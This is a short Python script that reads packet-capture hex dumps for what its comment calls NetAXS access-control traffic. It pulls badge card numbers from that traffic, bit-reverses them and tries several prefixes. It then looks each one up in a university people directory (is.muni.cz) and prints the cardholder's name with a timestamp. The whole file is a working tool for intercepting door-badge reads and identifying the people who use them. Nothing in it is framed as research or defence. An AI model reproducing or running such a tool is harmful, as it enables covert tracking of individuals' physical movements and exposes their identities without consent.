# chod@dopi.ci


import fileinput
import sys
import time
from urllib import request as urlrequest

global timestamp

def parse_identityline(idline, card):
    identity = idline[4:-5]
    print("{} Success! Card: {} Identity: {}".format(timestamp, card, identity))


def check_identity(card):
    onidentityline = False
    url = "https://is.muni.cz/dok/depository_in?vybos_vzorek_last=&vybos_vzorek={}&vybos_hledej=Vyhledat+osobu".format(card)
    req = urlrequest.Request(url)
    resp = urlrequest.urlopen(req)
    resp_string = resp.read().decode("utf-8")
    if "vizitka" not in resp_string:
        return False
    for line in resp_string.split("\n"):
        if onidentityline:
            onidentityline = False
            parse_identityline(line, card)
            return True
        if "\"vizitka\"" in line:
            onidentityline = True

def hexianity(num):
    res = []
    num = list(num)
    for ch in num:
        b = bin(int(ch,16))[2:]
        while len(b) < 4:
            b = "0"+b
        b = b[::-1]
        newch = hex(int(b,2))[2:]
        res.append(newch)
    return ("".join(res).upper())


def distill(line):
    line = line.split()
    lastpart = line[2]+line[3]
    firstparts = ["01","06","07","04","05","02","03","08","09"]
    for firstpart in firstparts:
        if check_identity(hexianity(firstpart+lastpart)):
            return
    print("{} no success with any of predefined prefixes :( but the last part is {}".format(timestamp, lastpart))


# main... just scroll through the lines
counter = -1

try:
   for line in iter(sys.stdin.readline, b''):
    if "IP" in line:
        timestamp = line.split()[0]
    if counter > -1:
        counter -= 1
    if counter == 0:
        distill(line)
    if "0x0030:  0106 0001 0064 0005" in line: #probably a header part for NetAXS
        counter = 2
except KeyboardInterrupt:
   sys.stdout.flush()
   pass

        
